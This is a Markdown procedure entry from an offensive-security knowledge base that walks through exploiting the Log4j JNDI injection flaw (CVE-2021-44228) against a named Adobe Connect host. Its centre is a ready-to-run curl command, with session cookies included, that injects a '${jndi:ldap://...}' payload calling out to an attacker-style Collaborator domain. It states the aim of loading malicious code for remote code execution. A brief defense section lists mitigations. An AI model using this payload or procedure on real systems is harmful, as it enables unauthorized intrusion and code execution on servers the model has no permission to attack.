---
id: uuid-for-procedure
tags:
  - log4j
  - jndi
  - ldap
  - rce
  - cve-2021-44228
type: procedure
tools:
  - '[[tools/Burp-Collaborator]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/send-malicious-get-with-jndi-payload]]'
verified: false
platforms:
  - Web
  - Java
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:23:49.111Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
---

# Trigger-Log4j-JNDI-Lookup-via-Malicious-Query-Parameter

## Summary

This procedure exploits the Log4j JNDI injection vulnerability (CVE-2021-44228) by injecting a malicious payload into a query parameter that gets logged by the vulnerable application, triggering an LDAP lookup to an attacker-controlled server and enabling remote code execution.

## Description

The Log4j library in versions prior to 2.15.0 processes message lookup substitution in log messages, allowing attacker-controlled strings to trigger JNDI lookups. In this scenario, targeting Adobe Connect at beta.dev.adobeconnect.com, a GET request to the root path with a query parameter 'x' containing a JNDI LDAP payload causes the server to log the input, perform an outbound LDAP connection to the attacker's domain (e.g., via Burp Collaborator), and potentially load and execute arbitrary code from the LDAP server. This demonstrates full RCE on the Java-based web server without authentication.

## Requirements

1. Network access to the target HTTPS endpoint (e.g., https://beta.dev.adobeconnect.com/)
2. Burp Collaborator or similar OOB interaction tool for monitoring
3. Vulnerable Log4j version (<=2.14.1) in the target application
4. Ability to craft and send HTTP requests (e.g., via curl or Burp Suite)

## Defense

Defensive measures and detection strategies:

- Upgrade Log4j to version 2.17.0 or later to mitigate JNDI lookups
- Disable JNDI message lookups by setting log4j2.formatMsgNoLookups=true
- Monitor and block outbound LDAP/DNS connections from application servers to unknown domains
- Sanitize and avoid logging user-controlled input directly
- Implement WAF rules to detect and block JNDI payloads like ${jndi:ldap://...}

## Objectives

1. Confirm vulnerability by triggering OOB LDAP/DNS interaction
2. Establish foundation for RCE by loading malicious code via LDAP
3. Assess impact on the target web application

## Instructions

### Step 1: Set Up Monitoring Tool

**Context**: Prepare Burp Collaborator to capture out-of-band interactions from the target server.

Launch Burp Suite and navigate to the Collaborator tab to generate a unique subdomain (e.g., attacker.burpcollaborator.net) for polling interactions.

### Step 2: Craft and Send Malicious Request

**Context**: Send the HTTP GET request with the JNDI payload in the 'x' query parameter to trigger logging and LDAP lookup.

**Command** ([[commands/send-malicious-get-with-jndi-payload]]):
```bash
curl -X GET "https://beta.dev.adobeconnect.com/?x=\${jndi:ldap://\${hostName}.attacker.burpcollaborator.net/a}" -H "Host: beta.dev.adobeconnect.com" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate" -H "Connection: close" -H "Cookie: BREEZESESSION=breezdiekv3smcc2xdw3u; BreezeCCookie=conn-BZTI-9BM9-2M7O-HWCG-XCF2-KDFT-KN7O-Y78S" -H "Upgrade-Insecure-Requests: 1" -H "Sec-Fetch-Dest: document" -H "Sec-Fetch-Mode: navigate" -H "Sec-Fetch-Site: none" -H "Sec-Fetch-User: ?1"
```

> This command sends a GET request to the root path with the payload in 'x', mimicking a browser request. The payload ${jndi:ldap://${hostName}.attacker.burpcollaborator.net/a} expands during logging, causing an LDAP query to the Collaborator domain. Expected output: HTTP 200 OK and server page content; check Collaborator for DNS/LDAP pings.

### Step 3: Verify Exploitation

**Context**: Poll Burp Collaborator for confirmation of successful trigger.

In Burp Collaborator, look for DNS resolution or LDAP connection attempts from the target's IP address.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/send-malicious-get-with-jndi-payload]]

## Tools Used

- [[tools/Burp-Collaborator]]

## Tags

- log4j
- jndi
- ldap
- rce
- cve-2021-44228
